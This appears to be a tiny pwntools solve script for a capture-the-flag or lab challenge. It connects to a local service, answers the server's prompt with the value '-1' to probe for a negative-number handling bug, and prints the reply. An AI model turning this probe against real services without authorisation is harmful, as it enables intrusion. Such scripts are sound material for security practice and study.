from pwn import *

# replace with the needed IP address and port
HOST = "127.0.0.1"
PORT = 42189

target = remote(HOST, PORT)

resp = target.recvuntil(b"? ")
target.sendline(b"-1")
resp = target.recvline()
print(f"SERVER SENDS RESPONSE: {resp.decode()}")